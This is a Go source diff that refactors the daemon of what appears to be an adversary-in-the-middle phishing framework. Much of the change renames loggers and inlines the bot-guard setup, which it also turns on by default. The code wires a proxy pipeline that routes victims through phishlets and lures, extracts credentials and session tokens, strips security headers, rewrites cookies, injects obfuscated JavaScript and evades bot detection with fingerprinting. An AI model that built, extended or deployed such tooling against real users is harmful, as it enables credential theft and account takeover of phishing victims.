@@ -65,15 +65,24 @@ func (d *Daemon) Init(ctx context.Context) error {
 
 	// Init cert source.
 	caDir := filepath.Join(filepath.Dir(cfg.DBPath), "ca")
-	certSource, err := cert.NewSource(d.developer, caDir, d.log)
+	certSource, err := cert.NewSource(d.developer, caDir, d.logger)
 	if err != nil {
 		return err
 	}
 
 	// Init botguard.
-	botGuardSvc, sigDB, err := newBotGuardService(d.bus, sqlite.NewBotStore(db), d.log)
-	if err != nil {
-		return err
+	botStore := sqlite.NewBotStore(db)
+	botGuardSvc := &aitm.BotGuardService{
+		Scorer: &botguard.Scorer{
+			Config: botguard.BotGuardConfig{
+				Enabled:            true,
+				TelemetryThreshold: 0.6,
+			},
+			SignatureFinder: botStore,
+			Logger:          d.logger,
+		},
+		Store: botStore,
+		Bus:   d.bus,
 	}
 
 	// Wire services.
@@ -83,7 +92,7 @@ func (d *Daemon) Init(ctx context.Context) error {
 	blacklistSvc := aitm.NewBlacklistService(d.bus)
 
 	spoofProxy := proxy.NewSpoofProxy("")
-	wsHub := proxy.NewWSHub(d.bus, d.log)
+	wsHub := proxy.NewWSHub(d.bus, d.logger)
 
 	// Build API handler.
 	apiHandler := api.NewRouter(api.RouterDeps{
@@ -91,19 +100,19 @@ func (d *Daemon) Init(ctx context.Context) error {
 		Lures:     lureSvc,
 		Phishlets: d.phishletStore,
 		Blacklist: blacklistSvc,
-		Botguard:  sigDB,
+		Botguard:  botStore,
 		Bus:       d.bus,
 		Domain:    cfg.Domain,
 		Version:   Version,
-		Logger:    d.log,
+		Logger:    d.logger,
 	})
 
 	// Init JS obfuscator — defaults to no-op; upgraded to Node sidecar when enabled.
 	d.obfuscator = &obfuscator.NoOpObfuscator{}
 	if cfg.Obfuscator.Enabled {
-		n, err := obfuscator.NewNodeObfuscator(cfg.Obfuscator, d.log)
+		n, err := obfuscator.NewNodeObfuscator(cfg.Obfuscator, d.logger)
 		if err != nil {
-			d.log.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
+			d.logger.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
 		} else {
 			d.obfuscator = n
 		}
@@ -122,33 +131,34 @@ func (d *Daemon) Init(ctx context.Context) error {
 		apiHandler:       apiHandler,
 		apiHostname:      cfg.API.SecretHostname,
 		obfuscator:       d.obfuscator,
-	}, d.log)
+	}, d.logger)
 
 	aitmProxy := &proxy.AITMProxy{
 		CertSource: certSource,
 		Pipeline:   pipeline,
 		WSHub:      wsHub,
 		Spoof:      spoofProxy,
-		Logger:     d.log,
+		Logger:     d.logger,
 	}
+
 	if cfg.API.SecretHostname != "" {
-		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, d.log)
+		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, d.logger)
 		if err != nil {
 			return err
 		}
-		if err := issueOperatorCert(clientCA, cfg.API.ClientCACertPath, d.log); err != nil {
+		if err := issueOperatorCert(clientCA, cfg.API.ClientCACertPath, d.logger); err != nil {
 			return err
 		}
 		aitmProxy.SecretHostname = cfg.API.SecretHostname
 		aitmProxy.ClientCAs = clientCA.CertPool()
-		d.log.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
+		d.logger.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
 	}
 	d.proxy = aitmProxy
 
 	// Start phishlet file watcher. Non-fatal — live reload is optional.
 	d.watcher, err = phishlet.NewWatcher(cfg.PhishletsDir, d.bus)
 	if err != nil {
-		d.log.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
+		d.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
 	} else {
 		d.phishletReloadSub = events.SubscribeFunc(d.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
 			if def, ok := ev.Payload.(*aitm.PhishletDef); ok {
@@ -158,7 +168,7 @@ func (d *Daemon) Init(ctx context.Context) error {
 		d.watcher.Start()
 	}
 
-	d.log.Info("miraged ready",
+	d.logger.Info("miraged ready",
 		"version", Version,
 		"domain", cfg.Domain,
 		"https_port", cfg.HTTPSPort,
@@ -203,7 +213,7 @@ func (d *Daemon) populateActivePhishlets(externalIP string, activeHostnames *pro
 func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
 	entries, err := os.ReadDir(dir)
 	if err != nil {
-		d.log.Warn("could not read phishlets directory", "dir", dir, "error", err)
+		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
 		return
 	}
 	loader := &phishlet.Loader{}
@@ -218,15 +228,13 @@ func (d *Daemon) loadPhishletDefs(dir string, resolver *aitm.PhishletResolver) {
 		path := filepath.Join(dir, entry.Name())
 		def, err := loader.Load(path)
 		if err != nil {
-			d.log.Warn("failed to load phishlet", "path", path, "error", err)
+			d.logger.Warn("failed to load phishlet", "path", path, "error", err)
 			continue
 		}
 		resolver.RegisterDef(def)
-		d.log.Info("loaded phishlet", "name", def.Name)
+		d.logger.Info("loaded phishlet", "name", def.Name)
 	}
 }
-
-// ── package-level helpers (kept out of Daemon to reduce coupling) ───────────────
 
 func loadConfig(path string) (*config.Config, error) {
 	cfg, err := config.Load(path)
@@ -237,19 +245,6 @@ func loadConfig(path string) (*config.Config, error) {
 		return nil, fmt.Errorf("invalid config: %w", err)
 	}
 	return cfg, nil
-}
-
-func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, *botguard.JA4SignatureDB, error) {
-	bgCfg := botguard.BotGuardConfig{
-		Enabled:            false,
-		TelemetryThreshold: 0.6,
-	}
-	sigDB, err := botguard.NewJA4SignatureDB("", bus, logger)
-	if err != nil {
-		return nil, nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
-	}
-	scorer := &botguard.Scorer{Cfg: bgCfg, SigDB: sigDB, Logger: logger}
-	return &aitm.BotGuardService{Scorer: scorer, Store: botStore, Bus: bus}, sigDB, nil
 }
 
 // issueOperatorCert issues a client certificate for the default operator if
@@ -308,27 +303,64 @@ type pipelineDeps struct {
 }
 
 func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
-	req := []proxy.RequestHandler{
-		&request.JA4Extractor{},
-		&request.BotGuardCheck{Service: d.botGuardSvc, Spoof: d.spoofProxy},
-		&request.IPExtractor{},
-		&request.BlacklistChecker{Service: d.blacklistSvc, Spoof: d.spoofProxy},
-		&request.APIRouter{SecretHostname: d.apiHostname, Handler: d.apiHandler},
-		&request.PhishletRouter{ActiveHostnameSet: d.activeHostnames, Resolver: d.phishletResolver, Spoof: d.spoofProxy},
-		&request.LureValidator{Spoof: d.spoofProxy},
-		&request.SessionResolver{Store: d.sessionStore, Factory: d.sessionSvc},
-		&request.TelemetryScoreCheck{Scorer: d.botGuardSvc, Spoof: d.spoofProxy, Threshold: 0.6},
-		&request.URLRewriter{},
-		&request.CredentialExtractor{Store: d.sessionStore, Bus: d.bus, Logger: logger},
-		&request.ForcePostInjector{},
+	return &proxy.Pipeline{
+		RequestHandlers: []proxy.RequestHandler{
+			&request.JA4Extractor{},
+			&request.BotGuardCheck{
+				Service: d.botGuardSvc,
+				Spoof:   d.spoofProxy,
+			},
+			&request.IPExtractor{},
+			&request.BlacklistChecker{
+				Service: d.blacklistSvc,
+				Spoof:   d.spoofProxy,
+			},
+			&request.APIRouter{
+				SecretHostname: d.apiHostname,
+				Handler:        d.apiHandler,
+			},
+			&request.PhishletRouter{
+				ActiveHostnameSet: d.activeHostnames,
+				Resolver:          d.phishletResolver,
+				Spoof:             d.spoofProxy,
+			},
+			&request.LureValidator{
+				Spoof: d.spoofProxy,
+			},
+			&request.SessionResolver{
+				Store:   d.sessionStore,
+				Factory: d.sessionSvc,
+			},
+			&request.TelemetryScoreCheck{
+				Scorer:    d.botGuardSvc,
+				Spoof:     d.spoofProxy,
+				Threshold: 0.6,
+			},
+			&request.URLRewriter{},
+			&request.CredentialExtractor{
+				Store:  d.sessionStore,
+				Bus:    d.bus,
+				Logger: logger,
+			},
+			&request.ForcePostInjector{},
+		},
+		ResponseHandlers: []proxy.ResponseHandler{
+			&response.SecurityHeaderStripper{},
+			&response.CookieRewriter{},
+			&response.SubFilterApplier{},
+			&response.TokenExtractor{
+				Store:     d.sessionStore,
+				Bus:       d.bus,
+				Completer: d.sessionSvc,
+				Whitelist: d.blacklistSvc,
+				Logger:    logger,
+			},
+			&response.JSInjector{},
+			&response.JSObfuscator{
+				Obfuscator: d.obfuscator,
+				Logger:     logger,
+			},
+		},
+		Logger: logger,
 	}
-	resp := []proxy.ResponseHandler{
-		&response.SecurityHeaderStripper{},
-		&response.CookieRewriter{},
-		&response.SubFilterApplier{},
-		&response.TokenExtractor{Store: d.sessionStore, Bus: d.bus, Completer: d.sessionSvc, Whitelist: d.blacklistSvc, Logger: logger},
-		&response.JSInjector{},
-		&response.JSObfuscator{Obfuscator: d.obfuscator, Logger: logger},
-	}
-	return &proxy.Pipeline{RequestHandlers: req, ResponseHandlers: resp, Logger: logger}
 }
